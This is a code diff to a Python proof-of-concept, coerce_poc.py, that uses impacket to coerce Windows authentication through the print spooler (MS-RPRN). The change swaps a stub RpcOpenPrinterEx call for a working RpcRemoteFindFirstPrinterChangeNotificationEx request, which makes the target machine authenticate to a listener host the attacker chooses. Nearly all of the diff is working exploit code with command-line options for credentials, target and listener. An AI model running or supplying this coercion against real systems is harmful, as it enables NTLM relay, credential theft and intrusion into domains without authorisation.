@@ -2,13 +2,12 @@
 # -*- coding: utf-8 -*-
 # File name          : coerce_poc.py
 # Author             : Podalirius (@podalirius_)
-# Date created       : 22 Jun 2022
-
+# Date created       : 9 Jul 2022
 
 import sys
 import argparse
 from impacket import system_errors
-from impacket.dcerpc.v5 import transport
+from impacket.dcerpc.v5 import transport, rprn
 from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
 from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR
 from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
@@ -29,21 +28,6 @@ class DCERPCSessionError(DCERPCException):
             return 'SessionError: unknown error code: 0x%x' % self.error_code
 
 
-class RpcOpenPrinterEx(NDRCALL):
-    opnum = 69
-    structure = (
-        ('pPrinterName', STRING_HANDLE), # Type: STRING_HANDLE
-        ('pDatatype', WSTR), # Type: wchar_t *
-        ('pDevModeContainer', DEVMODE_CONTAINER *), # Type: DEVMODE_CONTAINER *
-        ('AccessRequired', DWORD), # Type: DWORD
-        ('pClientInfo', SPLCLIENT_CONTAINER *), # Type: SPLCLIENT_CONTAINER *
-    )
-
-
-class RpcOpenPrinterExResponse(NDRCALL):
-    structure = ()
-
-
 class RPCProtocol(object):
     """
     Documentation for class RPCProtocol
@@ -56,11 +40,13 @@ class RPCProtocol(object):
     ncan_target = None
     __rpctransport = None
     dce = None
+    target = None
 
     def __init__(self):
         super(RPCProtocol, self).__init__()
 
     def connect(self, username, password, domain, lmhash, nthash, target, dcHost, doKerberos=False, targetIp=None):
+        self.target = target
         self.ncan_target = r'ncacn_np:%s[%s]' % (target, self.pipe)
         self.__rpctransport = transport.DCERPCTransportFactory(self.ncan_target)
 
@@ -112,16 +98,17 @@ class MS_RPRN(RPCProtocol):
     version = "1.0"
     pipe = r"\PIPE\spoolss"
 
-    def RpcOpenPrinterEx(self, listener):
+    def RpcRemoteFindFirstPrinterChangeNotificationEx(self, listener):
         if self.dce is not None:
-            print("[>] Calling RpcOpenPrinterEx() ...")
+            print("[>] Calling RpcRemoteFindFirstPrinterChangeNotificationEx() ...")
             try:
-                request = RpcOpenPrinterEx()
-                request['pPrinterName'] = None
-                request['pDatatype'] = None
-                request['pDevModeContainer'] = None
-                request['AccessRequired'] = None
-                request['pClientInfo'] = None
+                resp = rprn.hRpcOpenPrinter(self.dce, '\\\\%s\x00' % self.target)
+
+                request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
+                request['hPrinter'] = resp['pHandle']
+                request['fdwFlags'] = rprn.PRINTER_CHANGE_ADD_JOB
+                request['pszLocalMachine'] = '\\\\%s\x00' % listener
+                request['pOptions'] = NULL
                 # request.dump()
                 resp = self.dce.request(request)
             except Exception as e:
@@ -131,8 +118,8 @@ class MS_RPRN(RPCProtocol):
 
 
 if __name__ == '__main__':
-    print("Windows auth coerce using MS-RPRN::RpcOpenPrinterEx()\n")
-    parser = argparse.ArgumentParser(add_help=True, description="Proof of concept for coercing authentication with MS-RPRN::RpcOpenPrinterEx()")
+    print("Windows auth coerce using MS-RPRN::RpcRemoteFindFirstPrinterChangeNotificationEx()\n")
+    parser = argparse.ArgumentParser(add_help=True, description="Proof of concept for coercing authentication with MS-RPRN::RpcRemoteFindFirstPrinterChangeNotificationEx()")
 
     parser.add_argument("-u", "--username", default="", help="Username to authenticate to the endpoint.")
     parser.add_argument("-p", "--password", default="", help="Password to authenticate to the endpoint. (if omitted, it will be asked unless -no-pass is specified)")
@@ -173,6 +160,6 @@ if __name__ == '__main__':
     )
 
     if connected:
-        protocol.RpcOpenPrinterEx(options.listener)
+        protocol.RpcRemoteFindFirstPrinterChangeNotificationEx(options.listener)
 
     sys.exit()
